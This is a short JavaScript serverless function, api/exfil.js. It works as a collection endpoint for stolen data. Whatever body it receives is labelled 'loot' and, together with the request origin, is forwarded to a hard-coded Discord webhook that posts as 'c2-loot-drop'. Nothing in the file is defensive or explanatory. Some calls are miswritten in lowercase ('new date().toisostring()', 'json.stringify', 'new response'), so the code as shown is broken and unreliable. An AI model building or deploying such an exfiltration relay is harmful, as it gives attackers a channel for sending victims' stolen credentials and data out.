// api/exfil.js
export const config = { runtime: 'edge' };

const discord_webhook_url = 'https://discord.com/api/webhooks/1516092945067933797/tI4BBfCLmWm4IgcUk9_b3WiurJM5z1FWn1uJ33HcN0RcqTmQJlqU0aIXcaDQdz7S_6Or';

export default async function handler(req) {
    const loot = await req.text();
    const origin = req.headers.get('origin') || 'unknown';
    const embed = {
        title: '💰 loot drop',
        description: `\`\`\`${loot || 'empty'}\`\`\``,
        color: 15277667, // gold
        fields: [{ name: 'from', value: origin }],
        timestamp: new date().toisostring(),
    };
    fetch(discord_webhook_url, {
        method: 'post',
        headers: { 'content-type': 'application/json' },
        body: json.stringify({ username: 'c2-loot-drop', embeds: [embed] }),
    });
    return new response(null, { status: 204 });
}
